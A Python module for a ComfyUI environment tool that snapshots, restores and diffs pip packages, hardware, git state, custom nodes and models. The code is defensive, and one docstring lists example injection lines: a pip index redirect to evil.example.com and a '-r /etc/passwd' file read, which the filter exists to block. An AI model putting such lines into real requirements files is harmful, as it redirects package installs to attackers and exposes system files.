"""
pip state backup and restore.

Snapshot format has two logical sections:

  RESTORABLE (top)
  ----------------
  restorable.pypi       — pip install -r friendly, exact versions
  restorable.local      — local .whl entries (restorable if file still exists)
  restorable.editable   — editable installs (require repo/path to exist)

  BUILD SPEC (bottom — reference only, not used by restore)
  ----------------------------------------------------------
  environment           — Python, pip, OS
  hardware              — GPU, VRAM, CUDA driver
  key_packages          — torch, nunchaku, xformers, numpy, etc. with build tags
  comfyui               — root path, git hash, branch, version
  custom_nodes          — each node folder: git hash, commits-behind, dirty tree
  models                — counts, sizes, categories
  config_files          — extra_model_paths.yaml, comfyui.settings (verbatim)

Snapshots stored in: <monitor_dir>/backups/pip_state_TIMESTAMP.json
"""

from __future__ import annotations

import json
import os
import platform
import re
import subprocess
import sys
import tempfile
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

_BACKUP_DIR = Path(__file__).parent.parent / "backups"
# Fallback used when _BACKUP_DIR is inside a UAC-protected location
# (e.g. C:\Program Files\...) and the process lacks write permission.
_BACKUP_DIR_USER = Path.home() / ".comfyui-health" / "backups"


# ---------------------------------------------------------------------------
# Snapshot validation / normalization
# ---------------------------------------------------------------------------

def _coerce_snap(data: Any) -> dict[str, Any]:
    """
    Normalise a raw decoded JSON value into a safe snapshot dict.

    Every field that restore / diff / missing-model code accesses is coerced
    to its expected Python type.  Malformed values (wrong type, None, absent)
    are replaced with a safe empty equivalent so callers never hit AttributeError
    or TypeError from hand-edited or partially-written snapshots.

    Unknown / extra fields are passed through unchanged so future fields are
    not silently dropped.
    """
    if not isinstance(data, dict):
        data = {}

    # ── restorable section ─────────────────────────────────────────────────
    res_raw = data.get("restorable")
    res_dict = res_raw if isinstance(res_raw, dict) else {}

    def _str_list_from(d: dict[str, Any], key: str) -> list[str]:
        v = d.get(key)
        if isinstance(v, list):
            return [item for item in v if isinstance(item, str)]
        return []

    coerced_res: dict[str, Any] = {
        "pypi":         _str_list_from(res_dict, "pypi"),
        "local_wheels": _str_list_from(res_dict, "local_wheels"),
        "editable":     _str_list_from(res_dict, "editable"),
    }
    if "_note" in res_dict:
        coerced_res["_note"] = res_dict["_note"]
    data["restorable"] = coerced_res

    # ── legacy flat packages list ──────────────────────────────────────────
    pkgs_raw = data.get("packages")
    if isinstance(pkgs_raw, list):
        data["packages"] = [item for item in pkgs_raw if isinstance(item, str)]
    else:
        data["packages"] = []

    # ── simple dict fields ─────────────────────────────────────────────────
    for key in ("environment", "hardware", "key_packages", "comfyui", "model_sources",
                "model_checksums"):
        v = data.get(key)
        if not isinstance(v, dict):
            data[key] = {}

    # ── custom_nodes — must be a list of dicts ─────────────────────────────
    cn_raw = data.get("custom_nodes")
    if isinstance(cn_raw, list):
        data["custom_nodes"] = [n for n in cn_raw if isinstance(n, dict)]
    else:
        data["custom_nodes"] = []

    # ── models section ─────────────────────────────────────────────────────
    models_raw = data.get("models")
    if not isinstance(models_raw, dict):
        data["models"] = {}
    else:
        cats_raw = models_raw.get("categories")
        if not isinstance(cats_raw, dict):
            models_raw["categories"] = {}
        else:
            for cat, cat_val in list(cats_raw.items()):
                if not isinstance(cat_val, dict):
                    cats_raw[cat] = {}
                else:
                    files_raw = cat_val.get("files")
                    if not isinstance(files_raw, list):
                        cat_val["files"] = []
                    else:
                        # Each file entry must be a dict
                        cat_val["files"] = [f for f in files_raw if isinstance(f, dict)]

    return data


def _safe_req_lines(lines: list[str]) -> list[str]:
    """
    Filter pip requirement lines to reject option flags.

    A hand-edited snapshot could inject lines like
      -i https://evil.example.com/simple/
      --extra-index-url https://evil.example.com/simple/
      -r /etc/passwd
    which pip processes faithfully from a requirements file.  Drop any line
    that starts with '-' (an option flag) and log it so the user is aware.
    Comment lines and blank lines are also dropped here.

    Only lines that look like package specifiers (start with a letter or digit)
    are kept.

    NOTE — intentional limitation: ``-r <file>`` requirement-file includes are
    also dropped by the leading-dash rule.  Do NOT add special-casing for ``-r``
    here; allowing arbitrary file references in a hand-editable JSON snapshot
    would reintroduce the local-file-read injection vector this function exists
    to prevent.
    """
    safe: list[str] = []
    for raw_line in lines:
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        if line.startswith("-"):
            # Flag line in a supposedly data-only field — silently discard.
            # Caller may log a warning via the messages list.
            continue
        safe.append(line)
    return safe


def _safe_download_url(url: Any) -> str | None:
    """
    Return *url* only if it uses http or https.

    Rejects file://, javascript:, data:, ftp:, and any other scheme that
    could exfiltrate local files or cause urlretrieve to do something
    unexpected when fetching a model.
    """
    if not isinstance(url, str):
        return None
    stripped = url.strip()
    if stripped.startswith("https://") or stripped.startswith("http://"):
        return stripped
    return None


# ---------------------------------------------------------------------------
# Low-level helpers
# ---------------------------------------------------------------------------

def _backup_dir() -> Path:
    """
    Return the backup directory, creating it if needed.

    Primary location: <package>/../backups/ — sits next to the monitor.
    Fallback: ~/.comfyui-health/backups/ — used when the primary location is
    inside a UAC-protected path (e.g. C:\\Program Files\\...) and the process
    does not have write permission.

    Raises PermissionError with a clear message if neither location is writable.
    """
    try:
        _BACKUP_DIR.mkdir(parents=True, exist_ok=True)
        return _BACKUP_DIR
    except (PermissionError, OSError):
        pass
    try:
        _BACKUP_DIR_USER.mkdir(parents=True, exist_ok=True)
        return _BACKUP_DIR_USER
    except (PermissionError, OSError) as e:
        raise PermissionError(
            f"Cannot create backup directory — tried {_BACKUP_DIR} and "
            f"{_BACKUP_DIR_USER}.  Run as Administrator or move the app to a "
            f"user-writable location. ({e})"
        ) from e


def _snapshot_path(ts: str, install_name: str = "") -> Path:
    """
    pip_state_ComfyUI_20250325_1430.json   ← with install folder name
    pip_state_20250325_1430.json           ← fallback when name unavailable
    """
    slug = f"{install_name}_" if install_name else ""
    return _backup_dir() / f"pip_state_{slug}{ts}.json"


def _run(cmd: list[str], timeout: int = 30, cwd: str | None = None) -> tuple[int, str, str]:
    try:
        env = None
        if cmd and cmd[0] == "git":
            env = os.environ.copy()
            env["GIT_TERMINAL_PROMPT"] = "0"
            env["GIT_ASKPASS"] = "echo"
            env["SSH_ASKPASS"] = "echo"
            env["GCM_INTERACTIVE"] = "never"
            cmd = [cmd[0], "-c", "credential.helper="] + cmd[1:]
        r = subprocess.run(
            cmd, capture_output=True, timeout=timeout, cwd=cwd, env=env,
            encoding="utf-8", errors="replace",
        )
        return r.returncode, r.stdout, r.stderr
    except Exception as e:
        return -1, "", str(e)


def _freeze(python_exe: str) -> list[str]:
    rc, out, _ = _run([python_exe, "-m", "pip", "freeze"], timeout=30)
    if rc != 0:
        return []
    return [l.strip() for l in out.splitlines() if l.strip() and not l.startswith("#")]


def _classify_packages(packages: list[str]) -> tuple[list[str], list[str], list[str]]:
    """Split freeze lines into (pypi, local, editable)."""
    pypi, local, editable = [], [], []
    for line in packages:
        if line.startswith("-e "):
            editable.append(line)
        elif " @ file://" in line or re.search(r" @ [A-Za-z]:\\", line) or " @ /" in line:
            local.append(line)
        else:
            pypi.append(line)
    return pypi, local, editable


# ---------------------------------------------------------------------------
# Build spec collectors
# ---------------------------------------------------------------------------

def _collect_environment(python_exe: str) -> dict[str, Any]:
    rc, py_ver, _ = _run([python_exe, "--version"])
    rc2, pip_ver_raw, _ = _run([python_exe, "-m", "pip", "--version"])
    pip_ver_m = re.match(r"pip\s+([\d.]+)", pip_ver_raw)
    if pip_ver_m:
        pip_ver_clean = pip_ver_m.group(1)
    else:
        # Strip ANSI escape sequences and collapse whitespace before truncating.
        pip_ver_clean = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", pip_ver_raw).strip()[:40]
    return {
        "python_exe": python_exe,
        "python_version": py_ver.strip(),
        "pip_version": pip_ver_clean,
        "os": platform.platform(),
        "machine": platform.machine(),
    }


def _collect_hardware() -> dict[str, Any]:
    hw: dict[str, Any] = {}
    rc, smi, _ = _run(["nvidia-smi", "--query-gpu=name,memory.total,driver_version",
                        "--format=csv,noheader,nounits"])
    if rc == 0 and smi.strip():
        parts = [p.strip() for p in smi.strip().splitlines()[0].split(",")]
        if len(parts) >= 3:
            hw["gpu_name"] = parts[0]
            try:
                hw["gpu_vram_total_gb"] = round(int(parts[1]) / 1024, 1)
            except ValueError:
                hw["gpu_vram_total_gb"] = parts[1]
            hw["gpu_driver_version"] = parts[2]
    rc2, smi2, _ = _run(["nvidia-smi"])
    if rc2 == 0:
        m = re.search(r"CUDA Version:\s*([\d.]+)", smi2)
        if m:
            hw["cuda_driver_version"] = m.group(1)
    try:
        import psutil
        hw["ram_total_gb"] = round(psutil.virtual_memory().total / (1024 ** 3), 1)
    except Exception:
        pass
    return hw


_KEY_PKG_PROBE = r"""
import sys, json, re
import importlib.metadata as meta
import importlib

def ver(name):
    try: return meta.version(name)
    except Exception: pass
    try:
        m = importlib.import_module(name)
        return getattr(m, "__version__", None)
    except Exception: return None

out = {}
try:
    import torch
    out["torch"] = torch.__version__
    out["torch_cuda_build"] = torch.version.cuda
    out["torch_cuda_available"] = torch.cuda.is_available()
    if torch.cuda.is_available():
        out["gpu_name_torch"] = torch.cuda.get_device_name(0)
except ImportError: pass

try:
    import nunchaku
    try: out["nunchaku"] = meta.version("nunchaku")
    except Exception:
        for p in __import__("pathlib").Path(sys.prefix).rglob("nunchaku-*.dist-info"):
            out["nunchaku"] = p.name.split("-")[1]; break
    dist_names = [p.name for p in __import__("pathlib").Path(sys.prefix).rglob("nunchaku*.dist-info")]
    out["nunchaku_dist_names"] = dist_names
except ImportError: pass

for pkg in ["xformers","numpy","safetensors","transformers","diffusers","accelerate",
            "aiohttp","pydantic","requests","urllib3","triton","einops","kornia"]:
    v = ver(pkg)
    if v: out[pkg] = v

print(json.dumps(out))
"""


def _collect_key_packages(python_exe: str) -> dict[str, Any]:
    rc, out, _ = _run([python_exe, "-c", _KEY_PKG_PROBE], timeout=30)
    for line in out.splitlines():
        line = line.strip()
        if line.startswith("{"):
            try:
                data = json.loads(line)
                # Parse nunchaku build metadata from dist-info name
                for name in data.get("nunchaku_dist_names", []):
                    m = re.search(r"\+cu([\d.]+)torch([\d.]+)", name, re.IGNORECASE)
                    if m:
                        data["nunchaku_cuda_build"] = m.group(1)
                        data["nunchaku_torch_build"] = m.group(2)
                        break
                data.pop("nunchaku_dist_names", None)
                return data
            except Exception:
                pass
    return {}


def _collect_comfyui(comfyui_root: Path) -> dict[str, Any]:
    info: dict[str, Any] = {"root": str(comfyui_root)}

    # Git info for ComfyUI itself
    rc, hash_, _ = _run(["git", "rev-parse", "HEAD"], cwd=str(comfyui_root))
    if rc == 0:
        info["git_hash"] = hash_.strip()
    rc2, branch, _ = _run(["git", "rev-parse", "--abbrev-ref", "HEAD"], cwd=str(comfyui_root))
    if rc2 == 0:
        info["git_branch"] = branch.strip()
    rc3, tag, _ = _run(["git", "describe", "--tags", "--abbrev=0"], cwd=str(comfyui_root))
    if rc3 == 0:
        info["git_tag"] = tag.strip()

    return info


def _collect_custom_nodes(comfyui_root: Path) -> list[dict[str, Any]]:
    nodes_dir = comfyui_root / "custom_nodes"
    if not nodes_dir.exists():
        return []
    results = []
    try:
        node_entries = sorted(nodes_dir.iterdir())
    except (PermissionError, OSError):
        return results
    for node_dir in node_entries:
        if not node_dir.is_dir() or node_dir.name.startswith("."):
            continue
        entry: dict[str, Any] = {"name": node_dir.name}
        rc, hash_, _ = _run(["git", "rev-parse", "HEAD"], cwd=str(node_dir))
        if rc == 0:
            entry["git_hash"] = hash_.strip()
        rc2, branch, _ = _run(["git", "rev-parse", "--abbrev-ref", "HEAD"], cwd=str(node_dir))
        if rc2 == 0:
            entry["git_branch"] = branch.strip()
        # Check for upstream updates (non-blocking, best-effort)
        rc4, behind, _ = _run(
            ["git", "rev-list", "--count", "HEAD..@{upstream}"],
            cwd=str(node_dir), timeout=10
        )
        if rc4 == 0:
            try:
                n_behind = int(behind.strip())
                if n_behind > 0:
                    entry["commits_behind"] = n_behind
                    entry["has_updates"] = True
                else:
                    entry["has_updates"] = False
            except ValueError:
                pass
        # Dirty working tree — detect hand-edited files that a git pull would lose.
        # `git status --porcelain` outputs one line per changed/untracked file.
        # An empty output means the working tree is clean.
        rc_s, status_out, _ = _run(
            ["git", "status", "--porcelain"],
            cwd=str(node_dir), timeout=10,
        )
        if rc_s == 0:
            dirty_lines = [l for l in status_out.splitlines() if l.strip()]
            if dirty_lines:
                entry["has_local_changes"] = True
                entry["local_changes_count"] = len(dirty_lines)
                # Store up to 20 changed paths for reference (status code + filename)
                entry["local_changes"] = dirty_lines[:20]
            else:
                entry["has_local_changes"] = False
        # Count node classes
        init = node_dir / "__init__.py"
        if init.exists():
            try:
                text = init.read_text(encoding="utf-8", errors="ignore")
                m = re.search(r"NODE_CLASS_MAPPINGS\s*=\s*\{([^}]*)\}", text, re.DOTALL)
                if m:
                    entry["node_class_count"] = m.group(1).count(":")
            except Exception:
                pass
        results.append(entry)
    return results


def _collect_config_files(comfyui_root: Path) -> dict[str, Any]:
    """
    Capture key ComfyUI config files as plain text / parsed JSON.

    Files captured:
    - extra_model_paths.yaml  — tells ComfyUI where to find models on other drives
    - comfyui.settings        — frontend UI settings (JSON), stored under user/default/

    These are stored verbatim so they can be manually restored if the install
    is wiped or the user switches machines.  They are reference data only —
    the restore command does not apply them automatically.
    """
    configs: dict[str, Any] = {}

    # extra_model_paths.yaml
    yf = comfyui_root / "extra_model_paths.yaml"
    if yf.exists():
        try:
            configs["extra_model_paths_yaml"] = yf.read_text(encoding="utf-8", errors="replace")
        except Exception as e:
            configs["extra_model_paths_yaml_error"] = str(e)

    # comfyui.settings  — frontend preferences (newer builds store under user/default/)
    for settings_candidate in [
        comfyui_root / "user" / "default" / "comfyui.settings",
        comfyui_root / "comfyui.settings",
    ]:
        if not settings_candidate.exists():
            continue
        try:
            raw = settings_candidate.read_text(encoding="utf-8", errors="replace")
            configs["comfyui_settings_path"] = str(
                settings_candidate.relative_to(comfyui_root).as_posix()
            )
            try:
                configs["comfyui_settings"] = json.loads(raw)
            except Exception:
                configs["comfyui_settings_raw"] = raw
            break
        except Exception as e:
            configs["comfyui_settings_error"] = str(e)
            break

    return configs


def _collect_models(comfyui_root: Path) -> dict[str, Any]:
    try:
        from .model_scanner import scan_models
        result = scan_models(comfyui_root)
    except Exception as e:
        return {"_error": str(e)}

    categories: dict[str, Any] = {}
    for cat, files in result.by_category.items():
        try:
            file_entries = []
            for f in files:
                entry: dict[str, Any] = {
                    "name": f.path.name,
                    "size_gb": round(f.size_bytes / (1024 ** 3), 2),
                }
                if f.quant:
                    entry["quant"] = f.quant
                if f.family:
                    entry["family"] = f.family
                # Store the full path relative to comfyui_root as a posix string.
                # list_missing_models and restore_models use this to reconstruct the
                # correct on-disk path rather than guessing from the human-readable
                # category label (e.g. "Checkpoint" vs the actual dir "checkpoints").
                try:
                    entry["rel_path"] = f.path.relative_to(comfyui_root).as_posix()
                except ValueError:
                    pass   # path is outside comfyui_root — leave rel_path absent
                file_entries.append(entry)
            categories[cat] = {
                "count": len(files),
                "total_gb": round(sum(f.size_bytes for f in files) / (1024 ** 3), 2),
                "files": file_entries,
            }
        except Exception as e:
            categories[cat] = {"_error": str(e)}

    return {
        "total_files": result.total_files,
        "total_size_gb": round(result.total_size_gb, 2),
        "categories": categories,
    }


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def create_snapshot(
    python_exe: str | None = None,
    comfyui_root: Path | str | None = None,
    note: str = "",
    checksums: bool = False,
) -> Path:
    """
    Snapshot the current pip state and build spec.

    python_exe      — which Python to freeze (defaults to sys.executable)
    comfyui_root    — if provided, adds ComfyUI git info, custom nodes, and model list
    note            — free-text label stored with the snapshot
    checksums       — if True, compute SHA-256 for every model file (slow, opt-in)
    """
    exe = python_exe or sys.executable
    if comfyui_root is not None:
        comfyui_root = Path(comfyui_root)

    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M")

    # Build a clean slug from the install folder name for easy identification.
    # e.g.  C:\ai\ComfyUI  →  "ComfyUI"
    #        C:\ai\ComfyUI-nunchaku  →  "ComfyUI-nunchaku"
    install_name = ""
    if comfyui_root is not None:
        raw_name = Path(comfyui_root).resolve().name
        # Keep only alphanumeric, dash, underscore, dot — strip everything else
        install_name = re.sub(r"[^\w.\-]", "_", raw_name).strip("_")

    all_packages = _freeze(exe)
    pypi, local, editable = _classify_packages(all_packages)

    data: dict[str, Any] = {
        "timestamp": ts,
        "note": note,

        # ── RESTORABLE ──────────────────────────────────────────────────────
        "restorable": {
            "pypi": pypi,
            "local_wheels": local,
            "editable": editable,
            "_note": (
                "pypi entries can be restored with: pip install -r <file> --force-reinstall. "
                "local_wheels require the original .whl file. "
                "editable entries require the original repo/path."
            ),
        },

        # ── BUILD SPEC ───────────────────────────────────────────────────────
        "environment":  _collect_environment(exe),
        "hardware":     _collect_hardware(),
        "key_packages": _collect_key_packages(exe),
        "comfyui":      _collect_comfyui(comfyui_root) if comfyui_root and comfyui_root.exists() else {},
        "custom_nodes": _collect_custom_nodes(comfyui_root) if comfyui_root and comfyui_root.exists() else [],
        "models":       _collect_models(comfyui_root) if comfyui_root and comfyui_root.exists() else {},
        # Config files captured verbatim for reference / manual recovery
        "config_files": _collect_config_files(comfyui_root) if comfyui_root and comfyui_root.exists() else {},
        # Civitai / HuggingFace sidecar source URLs (populated automatically)
        "model_sources": _collect_model_sources(comfyui_root) if comfyui_root and comfyui_root.exists() else {},
        # SHA-256 checksums — only populated when checksums=True (opt-in, slow)
        "model_checksums": (
            compute_model_checksums(comfyui_root)
            if checksums and comfyui_root and comfyui_root.exists()
            else {}
        ),

        # ── LEGACY flat list (kept for backwards compat with older restore code) ──
        "packages": all_packages,
        "package_count": len(all_packages),
    }

    path = _snapshot_path(ts, install_name)
    tmp_path = path.with_suffix(".tmp")
    try:
        tmp_path.write_text(json.dumps(data, indent=2), encoding="utf-8")
        os.replace(tmp_path, path)
    except (PermissionError, OSError) as e:
        tmp_path.unlink(missing_ok=True)
        raise PermissionError(
            f"Cannot write snapshot to {path}: {e}.  "
            f"Run as Administrator or check permissions on {path.parent}."
        ) from e
    return path


def _is_snapshot(data: dict[str, Any]) -> bool:
    """True if a JSON dict looks like a pip state snapshot regardless of filename."""
    return bool(
        data.get("restorable") or data.get("packages")
    )


def list_snapshots() -> list[dict[str, Any]]:
    """Return all saved snapshots, newest first.

    Accepts any .json file in the backups folder — files can be freely renamed
    without breaking discovery.  Identity is determined by JSON content
    (comfyui.root, python version, etc.), never by filename.
    """
    snapshots = []
    bd = _backup_dir()
    try:
        candidates = sorted(bd.glob("*.json"), reverse=True)
    except (PermissionError, OSError):
        return snapshots
    for f in candidates:
        try:
            data = _coerce_snap(json.loads(f.read_text(encoding="utf-8")))
            if _is_snapshot(data):
                data["file"] = str(f)
                snapshots.append(data)
        except Exception:
            pass
    return snapshots


def list_snapshots_for(comfyui_root: Path | str) -> list[dict[str, Any]]:
    """Return only snapshots taken from the given ComfyUI installation, newest first."""
    target = Path(comfyui_root).resolve()
    result = []
    for snap in list_snapshots():
        snap_root = snap.get("comfyui", {}).get("root", "")
        if snap_root:
            try:
                if Path(snap_root).resolve() == target:
                    result.append(snap)
            except Exception:
                pass
    return result


def _parse_major_minor(version_str: str) -> str | None:
    """Extract 'X.Y' from a Python version string like 'Python 3.11.5'."""
    m = re.search(r"(\d+\.\d+)", version_str)
    return m.group(1) if m else None


def restore_snapshot(
    snapshot_path: str | Path | None = None,
    python_exe: str | None = None,
    comfyui_root: Path | str | None = None,
    dry_run: bool = False,
) -> tuple[bool, list[str]]:
    """
    Restore PyPI packages from a snapshot using --force-reinstall.

    comfyui_root  — when provided, the snapshot is verified to belong to this
                    exact installation before anything is touched:
                      • Hard block if snapshot.comfyui.root != comfyui_root
                      • Hard block if Python major.minor differs
                      • Warning if OS or CUDA driver changed
                    When snapshot_path is None, only snapshots from comfyui_root
                    are considered, so "restore latest" is always install-specific.
    """
    if comfyui_root is not None:
        comfyui_root = Path(comfyui_root).resolve()

    # ── Select snapshot ───────────────────────────────────────────────────
    if snapshot_path is None:
        snaps = list_snapshots_for(comfyui_root) if comfyui_root else list_snapshots()
        if not snaps:
            label = f" for {comfyui_root}" if comfyui_root else ""
            return False, [
                f"No snapshots found{label}.",
                "Take a snapshot first with option 7 (Backup pip state).",
            ]
        snap_data = snaps[0]
    else:
        try:
            snap_data = _coerce_snap(json.loads(Path(snapshot_path).read_text(encoding="utf-8")))
        except Exception as e:
            return False, [f"Could not read snapshot: {e}"]

    # Support both new format and legacy flat list
    restorable = snap_data.get("restorable", {})
    pypi: list[str] = restorable.get("pypi") or snap_data.get("packages", [])
    local: list[str] = restorable.get("local_wheels", [])
    editable: list[str] = restorable.get("editable", [])

    env = snap_data.get("environment", {})
    exe = (
        python_exe
        or env.get("python_exe")
        or snap_data.get("python_exe")
        or snap_data.get("python")
        or sys.executable
    )

    messages: list[str] = [
        f"Snapshot : {snap_data.get('timestamp', '?')}  {snap_data.get('note', '')}",
        f"Python   : {exe}",
        f"Packages : {len(pypi)} PyPI  {len(local)} local wheels  {len(editable)} editable",
        "",
    ]

    # ── Verification — install-path match ─────────────────────────────────
    snap_comfyui  = snap_data.get("comfyui", {})
    snap_root_str = snap_comfyui.get("root", "")

    if comfyui_root:
        if snap_root_str:
            try:
                snap_root_resolved = Path(snap_root_str).resolve()
            except Exception:
                snap_root_resolved = None

            if snap_root_resolved != comfyui_root:
                return False, messages + [
                    "┌─ BLOCKED ─────────────────────────────────────────────────┐",
                    "│  This snapshot belongs to a DIFFERENT ComfyUI installation │",
                    "└────────────────────────────────────────────────────────────┘",
                    f"  Snapshot taken from : {snap_root_str}",
                    f"  Currently selected  : {comfyui_root}",
                    "",
                    "  Restoring would overwrite the wrong environment's packages.",
                    "  Switch to the correct installation or select a snapshot",
                    "  that was taken from this installation.",
                ]
            else:
                messages.append(f"[OK] Installation path verified: {comfyui_root}")
        else:
            messages.append(
                "[WARN] Snapshot has no installation path recorded — "
                "cannot confirm it belongs to this installation."
            )
    elif snap_root_str:
        messages.append(f"[INFO] Snapshot was taken from: {snap_root_str}")

    # ── Verification — Python version match ───────────────────────────────
    snap_py_ver = env.get("python_version", "")   # e.g. "Python 3.11.5"
    if snap_py_ver and exe:
        if not Path(exe).exists():
            return False, messages + [
                "",
                "┌─ BLOCKED ──────────────────────────────────────────────────────┐",
                "│  Python executable recorded in this snapshot no longer exists   │",
                "└────────────────────────────────────────────────────────────────┘",
                f"  Expected : {exe}",
                "",
                "  The ComfyUI environment may have been moved or deleted.",
                "  Select the correct installation before restoring.",
            ]
        rc_py, cur_py_raw, _ = _run([exe, "--version"])
        cur_py_ver = cur_py_raw.strip()
        snap_mm = _parse_major_minor(snap_py_ver)
        cur_mm  = _parse_major_minor(cur_py_ver)
        messages.append(
            f"[OK] Python  snapshot={snap_py_ver.strip()}  target={cur_py_ver}"
            if (snap_mm and cur_mm and snap_mm == cur_mm)
            else f"Python  snapshot={snap_py_ver.strip()}  target={cur_py_ver}"
        )
        if snap_mm and cur_mm and snap_mm != cur_mm:
            return False, messages + [
                "",
                "┌─ BLOCKED ──────────────────────────────────────────────────────┐",
                "│  Python version mismatch — packages cannot be safely restored   │",
                "└────────────────────────────────────────────────────────────────┘",
                f"  Snapshot Python : {snap_py_ver.strip()}",
                f"  Target Python   : {cur_py_ver}",
                "",
                f"  Packages compiled for Python {snap_mm} will not work in",
                f"  Python {cur_mm} and would silently break the environment.",
            ]

    # ── Verification — OS / CUDA informational warnings ───────────────────
    snap_os  = env.get("os", "")
    cur_os   = platform.platform()
    if snap_os and snap_os != cur_os:
        messages.append(f"[WARN] OS changed since snapshot: {snap_os}  →  {cur_os}")

    snap_hw   = snap_data.get("hardware", {})
    snap_cuda = snap_hw.get("cuda_driver_version", "")
    if snap_cuda:
        cur_hw   = _collect_hardware()
        cur_cuda = cur_hw.get("cuda_driver_version", "")
        if cur_cuda and snap_cuda != cur_cuda:
            messages.append(
                f"[WARN] CUDA driver changed: {snap_cuda} → {cur_cuda}  "
                "(PyTorch may still work; verify after restore)"
            )

    messages.append("")

    # ── Build install list ────────────────────────────────────────────────
    # _safe_req_lines drops any line starting with '-' so a hand-edited snapshot
    # cannot inject pip option flags (e.g. -i / --extra-index-url) that would
    # redirect package downloads to an attacker-controlled index.
    to_install = _safe_req_lines(pypi)
    flagged = len(pypi) - len(to_install)
    if flagged:
        messages.append(
            f"[WARN] {flagged} line(s) starting with '-' were removed from the "
            f"package list — hand-edited snapshots must not contain pip option flags."
        )
    for entry in local:
        m = re.search(r"@ (file:///?)?(.+\.whl)", entry)
        whl_path = m.group(2) if m else None
        if whl_path and Path(whl_path).exists():
            to_install.append(entry)
            messages.append(f"  [local wheel] including : {Path(whl_path).name}")
        else:
            messages.append(f"  [SKIP] local wheel missing : {entry}")

    for entry in editable:
        messages.append(f"  [SKIP] editable install (restore manually) : {entry}")

    if not to_install:
        return False, messages + ["Nothing to install."]

    if dry_run:
        messages.append("Dry run — no changes made.")
        messages += [f"  would install: {p}" for p in to_install[:10]]
        if len(to_install) > 10:
            messages.append(f"  ... and {len(to_install) - 10} more")
        return True, messages

    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False, encoding="utf-8") as f:
        f.write("\n".join(to_install))
        req_file = f.name

    try:
        rc, out, err = _run(
            [exe, "-m", "pip", "install", "-r", req_file, "--force-reinstall", "--quiet"],
            timeout=600,
        )
        if rc == 0:
            messages.append("Restored successfully.")
        else:
            messages.append(f"pip install exited with code {rc}.")
            if err.strip():
                messages.append(err.strip()[:500])
    finally:
        try:
            os.unlink(req_file)
        except Exception:
            pass

    return rc == 0, messages


def diff_snapshots(
    snap_a: str | Path | dict[str, Any] | None = None,
    snap_b: str | Path | dict[str, Any] | None = None,
) -> dict[str, Any]:
    """
    Compare two snapshots.

    If both are None: compare the two most recent snapshots.
    If only snap_b is None: compare snap_a against the most recent.
    Accepts file paths, "latest"/"previous" keywords, or already-loaded dicts.

    Returns a structured diff with sections:
      meta, packages (added/removed/changed), key_packages, custom_nodes, models
    """
    snaps = list_snapshots()

    def _load(ref: str | Path | dict[str, Any] | None, default_index: int) -> dict[str, Any]:
        if ref is None:
            if len(snaps) <= default_index:
                raise ValueError(f"Need at least {default_index + 1} snapshots for diff")
            return snaps[default_index]
        if isinstance(ref, dict):
            return ref
        ref = str(ref)
        if ref == "latest":
            return snaps[0]
        if ref == "previous":
            return snaps[1]
        try:
            data = _coerce_snap(json.loads(Path(ref).read_text(encoding="utf-8")))
        except Exception as e:
            raise ValueError(f"Could not read snapshot '{ref}': {e}") from e
        data.setdefault("file", str(ref))
        return data

    a = _load(snap_a, 1)   # older  (shown as "before")
    b = _load(snap_b, 0)   # newer  (shown as "after")

    def _pkg_map(snap: dict[str, Any]) -> dict[str, str]:
        """name -> version from either new or legacy format."""
        lines: list[str] = (
            snap.get("restorable", {}).get("pypi")
            or snap.get("packages", [])
        )
        result: dict[str, str] = {}
        for line in lines:
            m = re.match(r"^([A-Za-z0-9_.\-]+)==(.+)$", line.strip())
            if m:
                result[m.group(1).lower()] = m.group(2)
        return result

    pkgs_a = _pkg_map(a)
    pkgs_b = _pkg_map(b)
    all_names = set(pkgs_a) | set(pkgs_b)

    added:   list[dict[str, str]] = []
    removed: list[dict[str, str]] = []
    changed: list[dict[str, str]] = []

    for name in sorted(all_names):
        va, vb = pkgs_a.get(name), pkgs_b.get(name)
        if va is None:
            added.append({"name": name, "version": vb})           # type: ignore[arg-type]
        elif vb is None:
            removed.append({"name": name, "version": va})
        elif va != vb:
            changed.append({"name": name, "from": va, "to": vb})

    # Key packages diff
    kp_a: dict[str, Any] = a.get("key_packages", {})
    kp_b: dict[str, Any] = b.get("key_packages", {})
    key_pkg_changes: list[dict[str, str]] = []
    for k in sorted(set(kp_a) | set(kp_b)):
        va2, vb2 = str(kp_a.get(k, "")), str(kp_b.get(k, ""))
        if va2 != vb2:
            key_pkg_changes.append({"key": k, "from": va2 or "(absent)", "to": vb2 or "(absent)"})

    # Custom nodes diff (git hash changes)
    def _node_map(snap: dict[str, Any]) -> dict[str, str]:
        return {n["name"]: n.get("git_hash", "") for n in snap.get("custom_nodes", [])}

    nodes_a = _node_map(a)
    nodes_b = _node_map(b)
    all_nodes = set(nodes_a) | set(nodes_b)
    node_changes: list[dict[str, str]] = []
    for name in sorted(all_nodes):
        ha, hb = nodes_a.get(name, ""), nodes_b.get(name, "")
        if ha != hb:
            node_changes.append({
                "name": name,
                "from": ha[:10] if ha else "(absent)",
                "to": hb[:10] if hb else "(absent)",
            })

    # Model count diff
    ma = a.get("models", {})
    mb = b.get("models", {})
    model_diff: dict[str, Any] = {}
    if ma or mb:
        model_diff = {
            "total_files": {"from": ma.get("total_files", 0), "to": mb.get("total_files", 0)},
            "total_size_gb": {"from": ma.get("total_size_gb", 0), "to": mb.get("total_size_gb", 0)},
        }
        cats_a = set((ma.get("categories") or {}).keys())
        cats_b = set((mb.get("categories") or {}).keys())
        added_cats  = sorted(cats_b - cats_a)
        removed_cats = sorted(cats_a - cats_b)
        if added_cats:
            model_diff["categories_added"] = added_cats
        if removed_cats:
            model_diff["categories_removed"] = removed_cats

    def _meta_entry(snap: dict[str, Any]) -> dict[str, Any]:
        root = snap.get("comfyui", {}).get("root", "")
        return {
            "timestamp":    snap.get("timestamp"),
            "note":         snap.get("note"),
            "file":         snap.get("file"),
            "comfyui_root": root,
            "comfyui_name": Path(root).name if root else "",
        }

    return {
        "meta": {
            "snapshot_a": _meta_entry(a),
            "snapshot_b": _meta_entry(b),
        },
        "packages": {
            "added":   added,
            "removed": removed,
            "changed": changed,
            "summary": f"+{len(added)} added  -{len(removed)} removed  ~{len(changed)} changed",
        },
        "key_packages": key_pkg_changes,
        "custom_nodes": node_changes,
        "models": model_diff,
    }


